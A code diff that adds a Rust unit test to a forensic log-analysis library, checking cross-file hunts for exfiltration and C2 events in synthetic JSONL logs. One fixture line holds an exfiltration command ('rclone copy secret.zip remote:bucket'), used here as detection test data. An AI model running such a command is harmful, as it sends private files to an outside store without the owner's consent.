@@ -452,3 +452,92 @@ fn test_cross_file_batch_ioc_and_analyst_prompts() {
     assert!(comm_patterns.iter().any(|p| p.eq_ignore_ascii_case("c2")));
     assert!(comm_patterns.iter().any(|p| p.eq_ignore_ascii_case("T1071")));
 }
+
+#[test]
+fn test_multi_file_real_correlation_exfiltration_and_communication() {
+    use log_parser_lib::commands::FileTarget;
+    use log_parser_lib::intel::analyst::{
+        extract_unified_events_for_indicators, multi_file_hunt,
+    };
+
+    let temp_dir = std::env::temp_dir().join("dfir_test_multifile");
+    let _ = std::fs::remove_dir_all(&temp_dir);
+    std::fs::create_dir_all(&temp_dir).unwrap();
+
+    let file_a_path = temp_dir.join("auth_logs.jsonl");
+    let file_b_path = temp_dir.join("network_traffic.jsonl");
+
+    let file_a_data = concat!(
+        "{\"time\": \"2026-10-24T01:00:00Z\", \"user\": \"alice\", \"ip\": \"198.51.100.45\", \"action\": \"UserLogin\", \"tool\": \"powershell.exe\"}\n",
+        "{\"time\": \"2026-10-24T01:05:00Z\", \"user\": \"alice\", \"ip\": \"198.51.100.45\", \"action\": \"Exfiltration upload\", \"command\": \"rclone copy secret.zip remote:bucket\"}\n"
+    );
+    let file_b_data = concat!(
+        "{\"time\": \"2026-10-24T01:02:00Z\", \"user\": \"bob\", \"client_ip\": \"198.51.100.45\", \"protocol\": \"HTTPS\", \"detail\": \"Outbound connection C2 beaconing to external IP\"}\n",
+        "{\"time\": \"2026-10-24T01:10:00Z\", \"user\": \"charlie\", \"client_ip\": \"203.0.113.88\", \"protocol\": \"DNS\", \"detail\": \"Standard DNS query\"}\n"
+    );
+
+    std::fs::write(&file_a_path, file_a_data).unwrap();
+    std::fs::write(&file_b_path, file_b_data).unwrap();
+
+    let db_a_path = temp_dir.join("auth_logs.db");
+    let db_b_path = temp_dir.join("network_traffic.db");
+
+    let stats_a = import_stream_into_db(&file_a_path, &db_a_path, UniversalFormat::JsonLines, |_, _| {}).unwrap();
+    assert_eq!(stats_a.row_count, 2);
+
+    let stats_b = import_stream_into_db(&file_b_path, &db_b_path, UniversalFormat::JsonLines, |_, _| {}).unwrap();
+    assert_eq!(stats_b.row_count, 2);
+
+    let targets = vec![
+        FileTarget {
+            path: file_a_path.to_string_lossy().to_string(),
+            sheet: None,
+            cache_db_path: Some(db_a_path.to_string_lossy().to_string()),
+        },
+        FileTarget {
+            path: file_b_path.to_string_lossy().to_string(),
+            sheet: None,
+            cache_db_path: Some(db_b_path.to_string_lossy().to_string()),
+        },
+    ];
+
+    // 1. Test AI Exfiltration hunt across files
+    let exfil_ans = multi_file_hunt(&targets, "show me exfiltration in all files").unwrap();
+    let exfil_events = exfil_ans.correlated_events.as_ref().expect("exfil events present");
+    assert!(!exfil_events.is_empty(), "Must find exfiltration events");
+    assert!(
+        exfil_events.iter().any(|e| e.file_name.contains("auth_logs")),
+        "Exfiltration upload must be found in auth_logs"
+    );
+
+    // 2. Test AI Communication hunt across files
+    let comm_ans = multi_file_hunt(&targets, "show me communication in all files").unwrap();
+    let comm_events = comm_ans.correlated_events.as_ref().expect("comm events present");
+    assert!(!comm_events.is_empty(), "Must find communication events");
+    assert!(
+        comm_events.iter().any(|e| e.file_name.contains("network_traffic")),
+        "C2 communication must be found in network_traffic"
+    );
+
+    // 3. Test Batch indicator extraction across files (shared IP 198.51.100.45)
+    let indicators = vec!["198.51.100.45".to_string()];
+    let unified_events = extract_unified_events_for_indicators(&targets, &indicators);
+    assert_eq!(unified_events.len(), 3, "198.51.100.45 appears in 2 events in file A and 1 event in file B");
+
+    let file_names: Vec<String> = unified_events.iter().map(|e| e.file_name.clone()).collect();
+    assert!(file_names.iter().any(|f| f.contains("auth_logs")));
+    assert!(file_names.iter().any(|f| f.contains("network_traffic")));
+
+    // Verify chronological ordering across files: 01:00:00 -> 01:02:00 -> 01:05:00
+    if let (Some(t0), Some(t1), Some(t2)) = (
+        unified_events[0].epoch_ms,
+        unified_events[1].epoch_ms,
+        unified_events[2].epoch_ms,
+    ) {
+        assert!(t0 <= t1, "Timeline order t0 <= t1");
+        assert!(t1 <= t2, "Timeline order t1 <= t2");
+    }
+
+    // Clean up
+    let _ = std::fs::remove_dir_all(&temp_dir);
+}
